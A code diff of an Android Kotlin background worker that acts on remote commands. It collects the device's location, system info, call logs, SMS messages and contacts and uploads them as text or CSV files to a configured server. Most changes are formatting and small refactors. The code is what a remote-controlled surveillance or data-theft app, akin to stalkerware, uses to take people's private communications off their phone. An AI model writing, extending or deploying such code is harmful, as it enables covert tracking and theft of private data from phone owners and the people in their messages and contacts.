@@ -1,8 +1,10 @@
+// DataFetchWorker.kt
 package com.example.lta
 
 import android.Manifest
 import android.content.Context
 import android.content.pm.PackageManager
+import android.location.Location
 import android.util.Log
 import androidx.core.content.ContextCompat
 import androidx.work.CoroutineWorker
@@ -19,38 +21,38 @@ import java.io.File
  * - Location tracking
  * - System information collection
  * - CSV exports of call logs, SMS, and contacts
- * 
+ *
  * All operations are performed with proper permission checks and error handling.
  */
 class DataFetchWorker(
-    private val appContext: Context, 
+    private val appContext: Context,
     workerParams: WorkerParameters
 ) : CoroutineWorker(appContext, workerParams) {
 
     companion object {
         const val KEY_COMMAND = "COMMAND"
         private const val TAG = "DataFetchWorker"
-        
+
         // Command constants for better type safety
         private const val COMMAND_GET_LOCATION = "get_location"
         private const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
         private const val COMMAND_GET_CALL_LOGS = "get_call_logs"
         private const val COMMAND_GET_SMS = "get_sms"
         private const val COMMAND_GET_CONTACTS = "get_contacts"
-        
+
         // Minimum CSV lines to consider valid data (header + at least one row)
         private const val MIN_CSV_LINES = 2
     }
 
     // Lazy initialization to avoid unnecessary object creation
-    private val apiClient by lazy { 
-        ApiClient(appContext.getString(R.string.server_base_url)) 
+    private val apiClient by lazy {
+        ApiClient(appContext.getString(R.string.server_base_url))
     }
-    private val manualDataManager by lazy { 
-        ManualDataManager(appContext) 
+    private val manualDataManager by lazy {
+        ManualDataManager(appContext)
     }
-    private val systemInfoManager by lazy { 
-        SystemInfoManager(appContext) 
+    private val systemInfoManager by lazy {
+        SystemInfoManager(appContext)
     }
 
     /**
@@ -62,7 +64,7 @@ class DataFetchWorker(
             Log.e(TAG, "Worker started without a valid command")
             return Result.failure()
         }
-        
+
         Log.d(TAG, "Executing command: $command")
 
         return withContext(Dispatchers.IO) {
@@ -94,7 +96,7 @@ class DataFetchWorker(
                 csvProvider = manualDataManager::getCallLogsAsCsv
             )
             COMMAND_GET_SMS -> fetchAndSendCsv(
-                dataType = "SMS", 
+                dataType = "SMS",
                 csvProvider = manualDataManager::getSmsAsCsv
             )
             COMMAND_GET_CONTACTS -> fetchAndSendCsv(
@@ -150,7 +152,7 @@ class DataFetchWorker(
      */
     private fun hasLocationPermission(): Boolean {
         return ContextCompat.checkSelfPermission(
-            appContext, 
+            appContext,
             Manifest.permission.ACCESS_FINE_LOCATION
         ) == PackageManager.PERMISSION_GRANTED
     }
@@ -158,11 +160,11 @@ class DataFetchWorker(
     /**
      * Gets current location using FusedLocationProvider
      */
-    private suspend fun getCurrentLocation(): android.location.Location? {
+    private suspend fun getCurrentLocation(): Location? {
         val fusedLocationClient = LocationServices.getFusedLocationProviderClient(appContext)
         return try {
             fusedLocationClient.getCurrentLocation(
-                Priority.PRIORITY_BALANCED_POWER_ACCURACY, 
+                Priority.PRIORITY_BALANCED_POWER_ACCURACY,
                 null
             ).await()
         } catch (e: Exception) {
@@ -176,16 +178,16 @@ class DataFetchWorker(
      */
     private suspend fun fetchAndSendSystemInfo(): Boolean {
         return try {
-            val networkInfo = systemInfoManager.getNetworkInfo()
-            val batteryInfo = systemInfoManager.getBatteryInfo()
-            
+            val networkInfo = systemInfoManager.getNetworkType()
+            val batteryInfo = systemInfoManager.getBatteryStatus()
+
             val systemInfoMessage = buildString {
                 appendLine("⚙️ System Info:")
                 appendLine("Network: $networkInfo")
-                appendLine(batteryInfo) // Fixed: Use appendLine instead of append
+                appendLine(batteryInfo.toString()) // Fixed: Explicitly convert to String
             }
-            
-            apiClient.uploadText(systemInfoMessage)
+
+            apiClient.uploadText(systemInfoMessage.trim())
         } catch (e: Exception) {
             Log.e(TAG, "Error fetching system info", e)
             apiClient.uploadText("⚙️ System Info: Error occurred - ${e.message}")
@@ -193,19 +195,20 @@ class DataFetchWorker(
         }
     }
 
+
     /**
      * Generic method to fetch CSV data and upload as file
      * @param dataType Human-readable name for the data type
      * @param csvProvider Function that returns CSV data as string
      */
     private suspend fun fetchAndSendCsv(
-        dataType: String, 
-        csvProvider: suspend () -> String
+        dataType: String,
+        csvProvider: () -> String
     ): Boolean {
         return try {
             Log.d(TAG, "Fetching $dataType data")
             val csvData = csvProvider()
-            
+
             // Check if CSV has meaningful data (more than just header)
             val lineCount = csvData.lines().size
             if (lineCount < MIN_CSV_LINES) {
@@ -215,11 +218,11 @@ class DataFetchWorker(
 
             // Create temporary file for CSV data
             val tempFile = createTempCsvFile(dataType, csvData)
-            
+
             return try {
                 // Fixed: Use caption parameter instead of description
                 val success = apiClient.uploadFile(
-                    file = tempFile, 
+                    file = tempFile,
                     caption = "📊 Exported $dataType from device (${lineCount - 1} records)"
                 )
                 if (success) {
